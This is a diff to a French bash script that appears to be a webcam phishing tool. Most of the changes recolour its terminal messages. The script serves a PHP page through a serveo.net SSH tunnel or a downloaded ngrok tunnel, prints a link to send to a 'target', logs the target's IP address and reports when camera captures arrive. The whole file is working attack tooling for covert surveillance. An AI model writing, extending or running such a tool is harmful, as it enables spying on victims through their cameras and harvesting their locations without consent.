@@ -1,5 +1,4 @@
 #!/bin/bash
-
 clear
 trap 'printf "\n";arret' 2
 logo_peche() {
@@ -32,30 +31,30 @@ dependances() {
 command -v php > /dev/null 2>&1 || { echo >&2 "J'ai besoin de php mais il n'est pas installé. Installez-le et relancez."; exit 1; }
 }
 requete_ip() {
-ip_add=$(grep -a 'IP adresse :' ipadd.txt | cut -d " " -f2 | tr -d '\r')
+ip_add=$(grep -a '\e[1;91m[\e[1;93m!\e[1;91m]\e[1;97m IP adresse \e[1;91m: \e[1;92m' ipadd.txt | cut -d " " -f2 | tr -d '\r')
 IFS=$'\n'
-printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP adresse cibler : \e[0m\e[1;77m %s\e[0m\n" $ip_add
+printf "\e[1;91m[\e[1;93m!\e[1;91m]\e[1;97m IP adresse cibler \e[1;91m: \e[0m\e[1;77m %s\e[0m\n" $ip_add
 cat ipadd.txt >> Sauvegarder sous ipadd.txt
 }
 verificateur() {
 printf "\n"
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Cible en attente,\e[0m\e[1;77m Appuyez sur Ctrl + C pour quitter...\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Cible en attente,\e[0m\e[1;77m Appuyez sur\e[1;91m Ctrl + Z\e[1;97m pour quitter...\e[0m\n"
 while [ true ]; do
 if [[ -e "ipadd.txt" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] La cible a ouvert le lien!\n"
+printf "\n\e[1;91m[\e[1;93m*\e[1;91m]\e[1;97m La cible a ouvert le lien!\n"
 rm -rf ipadd.txt
 fi
 sleep 0.5
 if [[ -e "Log.log" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Fichier camera reçu!\e[0m\n"
+printf "\n\e[1;91m[\e[1;93m*\e[1;91m]\e[1;97m Fichier camera reçu!\e[0m\n"
 rm -rf Log.log
 fi
 sleep 0.5
 done 
 }
 serveur() {
-command -v ssh > /dev/null 2>&1 || { echo >&2 "J'ai besoin de ssh mais il n'est pas installé. Installez-le et relancez."; exit 1; }
-printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Démarrage du serveur Serveo...\e[0m\n"
+command -v ssh > /dev/null 2>&1 || { echo >&2 "\e[1;91m[\e[1;93m!\e[1;91m]\e[1;97m J'ai besoin de ssh mais il n'est pas installé. Installez-le et relancez."; exit 1; }
+printf "\e[1;91m[\e[1;93m+\e[1;91m]\e[1;97m Démarrage du serveur Serveo...\e[0m\n"
 if [[ $verificateur_php == *'php'* ]]; then
 killall -2 php > /dev/null 2>&1
 fi
@@ -66,12 +65,12 @@ else
 $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &
 sleep 8
 fi
-printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Démarrage du serveur php... (localhost:3333)\e[0m\n"
+printf "\e[1;91m[\e[1;93m*\e[1;91m]\e[1;97m Démarrage du serveur php... (localhost:3333)\e[0m\n"
 fuser -k 3333/tcp > /dev/null 2>&1
 php -S localhost:3333 > /dev/null 2>&1 &
 sleep 3
 envoi_lien=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
-printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Lien direct : \e[0m\e[1;77m %s\n' $envoi_lien
+printf '\e[1;91m[\e[0m\e[1;77m+\e[0m\e[1;91m]\e[1;97m Lien direct \e[1;91m]: \e[0m\e[1;77m %s\n' $envoi_lien
 }
 charge_utile_ngrok() {
 lien=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
@@ -82,9 +81,9 @@ ngrok_serveur() {
 if [[ -e ngrok ]]; then
 echo ""
 else
-command -v unzip > /dev/null 2>&1 || { echo >&2 "J'ai besoin de décompresser mais ce n'est pas installé. Installez-le et relancez."; exit 1; }
-command -v wget > /dev/null 2>&1 || { echo >&2 "J'ai besoin de wget mais il n'est pas installé. Installez-le.et relancez."; exit 1; }
-printf "\e[1;92m[\e[0m+\e[1;92m] Téléchargement de Ngrok...\n"
+command -v unzip > /dev/null 2>&1 || { echo >&2 "\e[1;91m[\e[1;93m!\e[1;91m]\e[1;97m J'ai besoin de décompresser mais ce n'est pas installé. Installez-le et relancez."; exit 1; }
+command -v wget > /dev/null 2>&1 || { echo >&2 "\e[1;91m[\e[1;93m!\e[1;91m]\e[1;97m J'ai besoin de wget mais il n'est pas installé. Installez-le.et relancez."; exit 1; }
+printf "\e[1;91m[\e[1;93m+\e[1;91m]\e[1;97m Téléchargement de Ngrok...\n"
 arch=$(uname -a | grep -o 'arm' | head -n1)
 arch2=$(uname -a | grep -o 'Android' | head -n1)
 if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
@@ -94,7 +93,7 @@ unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
 chmod +x ngrok
 rm -rf ngrok-stable-linux-arm.zip
 else
-printf "\e[1;93m[!] Erreur de téléchargement ... Termux.\nExécutez cette commande \e[0m\e[1;77m pkg install wget\e[0m\n"
+printf "\e[1;91m[\e[1;93m!\e[1;91m]\e[1;97m Erreur de téléchargement ... Termux.\nExécutez cette commande \e[0m\e[1;77m pkg install wget\e[0m\n"
 exit 1
 fi
 else
@@ -104,19 +103,19 @@ unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
 chmod +x ngrok
 rm -rf ngrok-stable-linux-386.zip
 else
-printf "\e[1;93m[!] Erreur de téléchargement... \e[0m\n"
+printf "\e[1;91m[\e[1;93m!\e[1;91m]\e[1;97m Erreur de téléchargement... \e[0m\n"
 exit 1
 fi
 fi
 fi
-printf "\e[1;92m[\e[0m+\e[1;92m] Démarrage du serveur php...\n"
+printf "\e[1;91m[\e[0m+\e[1;91m]\e[1;93m Démarrage du serveur php...\n"
 php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
 sleep 2
-printf "\e[1;92m[\e[0m+\e[1;92m] Démarrage du serveur ngrok...\n"
+printf "\e[1;91m[\e[0m+\e[1;91m]\e[1;93m Démarrage du serveur ngrok...\n"
 ./ngrok http 3333 > /dev/null 2>&1 &
 sleep 10
 lien=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-printf "\e[1;92m[\e[0m*\e[1;92m] Lien direct \e[1;91m: \e[0m\e[1;77m %s\e[0m\n" $lien
+printf "\e[1;91m[\e[0m*\e[1;91m]\e[1;93m Lien direct \e[1;91m: \e[0m\e[1;77m %s\e[0m\n" $lien
 charge_utile_ngrok
 verificateur
 }
@@ -134,12 +133,12 @@ option_serveur_par_defaut="1"
 read -p $'\e[1;77m╚═\e[1;31m▶\e[38;5;245m Mr \e[38;5;221mFaxel \e[1;91m▶▶ \e[1;76m\e[0m' option_serveur
 option_serveur="${option_serveur:-${option_serveur_par_defaut}}"
 if [[ $option_serveur -eq 1 ]]; then
-command -v php > /dev/null 2>&1 || { echo >&2 "J'ai besoin de ssh mais il n'est pas installé.\nInstallez-le  pip2 install ssh et relancez."; exit 1; }
+command -v php > /dev/null 2>&1 || { echo >&2 "\e[1;97mJ'ai besoin de ssh mais il n'est pas installé.\nInstallez-le\e[1;93m pip2 install ssh\e[1;97m et relancez."; exit 1; }
 debut
 elif [[ $option_serveur -eq 2 ]]; then
 ngrok_serveur
 else
-printf "\e[1;93m [!] Option invalide!\e[0m\n"
+printf "\e[1;91m[\e[1;93m!\e[1;91m]\e[1;97m Option invalide!\e[0m\n"
 sleep 1
 clear
 commencons
